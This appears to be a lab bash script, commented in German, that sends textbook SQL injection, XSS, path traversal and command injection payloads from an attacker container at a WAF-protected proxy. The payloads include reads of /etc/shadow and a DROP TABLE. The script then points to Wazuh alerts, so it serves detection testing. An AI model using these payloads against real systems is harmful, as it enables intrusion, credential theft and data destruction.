#!/bin/bash
# Angriffsszenario 3: Web Application Attacks
# Simuliert SQL Injection, XSS, und andere Web-Angriffe

echo "=== Web Application Angriff Szenario ==="
echo "Dieser Angriff simuliert verschiedene Web-Angriffe (SQLi, XSS, Path Traversal)"
echo ""

TARGET_HOST="${1:-reverse-proxy-waf}"
ATTACKER="${2:-attacker-internet}"

echo "[+] Starte Web-Angriffe von $ATTACKER gegen $TARGET_HOST"

# SQL Injection Versuche
echo "[*] SQL Injection Angriffe..."
SQL_PAYLOADS=(
    "' OR '1'='1"
    "admin' --"
    "' OR 1=1--"
    "1' UNION SELECT NULL,NULL,NULL--"
    "'; DROP TABLE users--"
    "1' AND '1'='1"
)

for payload in "${SQL_PAYLOADS[@]}"; do
    echo "  [>] Payload: $payload"
    sudo docker exec clab-dmz-project-sun-$ATTACKER \
        curl -s -A "Mozilla/5.0" "http://$TARGET_HOST/login.php?user=$payload&pass=test" \
        -o /dev/null 2>/dev/null || true
    sleep 0.5
done

# XSS Versuche
echo "[*] Cross-Site Scripting (XSS) Angriffe..."
XSS_PAYLOADS=(
    "<script>alert('XSS')</script>"
    "<img src=x onerror=alert('XSS')>"
    "<svg/onload=alert('XSS')>"
    "javascript:alert('XSS')"
    "<iframe src='javascript:alert(1)'>"
)

for payload in "${XSS_PAYLOADS[@]}"; do
    echo "  [>] Payload: $payload"
    sudo docker exec clab-dmz-project-sun-$ATTACKER \
        curl -s -A "Mozilla/5.0" "http://$TARGET_HOST/search.php?q=$payload" \
        -o /dev/null 2>/dev/null || true
    sleep 0.5
done

# Path Traversal Versuche
echo "[*] Path Traversal Angriffe..."
PATH_PAYLOADS=(
    "../../../../etc/passwd"
    "..\\..\\..\\..\\windows\\system32\\config\\sam"
    "....//....//....//etc/passwd"
    "..%2F..%2F..%2Fetc%2Fpasswd"
)

for payload in "${PATH_PAYLOADS[@]}"; do
    echo "  [>] Payload: $payload"
    sudo docker exec clab-dmz-project-sun-$ATTACKER \
        curl -s -A "Mozilla/5.0" "http://$TARGET_HOST/download.php?file=$payload" \
        -o /dev/null 2>/dev/null || true
    sleep 0.5
done

# Command Injection Versuche
echo "[*] Command Injection Angriffe..."
CMD_PAYLOADS=(
    "; ls -la"
    "| cat /etc/passwd"
    "\`whoami\`"
    "\$(cat /etc/shadow)"
)

for payload in "${CMD_PAYLOADS[@]}"; do
    echo "  [>] Payload: $payload"
    sudo docker exec clab-dmz-project-sun-$ATTACKER \
        curl -s -A "Mozilla/5.0" "http://$TARGET_HOST/ping.php?host=localhost$payload" \
        -o /dev/null 2>/dev/null || true
    sleep 0.5
done

echo ""
echo "[+] Web-Angriffe abgeschlossen"
echo "[+] Überprüfe Wazuh Dashboard für Alerts: https://localhost:8443"
echo "[+] Suche nach: 'sql injection', 'xss', 'path traversal', 'command injection'"
